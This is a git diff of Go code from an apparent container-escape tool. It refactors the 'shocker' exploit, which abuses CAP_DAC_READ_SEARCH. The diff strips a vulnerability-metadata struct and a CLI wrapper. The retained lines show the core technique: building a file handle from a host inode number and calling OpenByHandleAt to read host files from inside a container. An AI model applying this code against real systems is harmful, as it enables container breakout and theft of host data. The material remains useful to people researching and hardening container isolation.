@@ -9,42 +9,9 @@ import (
 	"syscall"
 
 	"github.com/ctrsploit/ctrsploit/pkg/util"
-	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
-	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
-	"github.com/ctrsploit/sploit-spec/pkg/vul"
 	"github.com/ssst0n3/awesome_libs/awesome_error"
-	"github.com/urfave/cli/v2"
 	"golang.org/x/sys/unix"
 )
-
-type Vulnerability struct {
-	vul.BaseVulnerability
-}
-
-var Shocker = Vulnerability{
-	BaseVulnerability: vul.BaseVulnerability{
-		Name:        "shocker",
-		Description: "Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.",
-		Level:       vul.LevelHigh,
-		ExeEnv: exeenv.ExeEnv{
-			Env:     exeenv.InContainer,
-			Check:   exeenv.InContainer,
-			Exploit: exeenv.InContainer,
-		},
-		CheckSecPrerequisites:    &capability.CapDacReadSearchBnd,
-		ExploitablePrerequisites: &capability.CapDacReadSearchEff,
-	},
-}
-
-func (v *Vulnerability) Exploit(context *cli.Context) (err error) {
-	err = v.BaseVulnerability.Exploit(context)
-	if err != nil {
-		return
-	}
-	inode := context.Int("inode")
-	ref := context.String("ref")
-	return Exploit(inode, ref, os.Stdin, os.Stdout, os.Stderr)
-}
 
 func Exploit(inode int, ref string, i io.Reader, o, e io.Writer) (err error) {
 	fd, err := GetFd(inode, ref)
@@ -83,7 +50,6 @@ func GetFd(inode int, ref string) (fd int, err error) {
 	}
 	defer syscall.Close(hostReference)
 	inodeBytes := make([]byte, 8)
-	// 将 inode 转换为小端序的字节数组
 	binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
 	handle := unix.NewFileHandle(1, inodeBytes)
 	fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
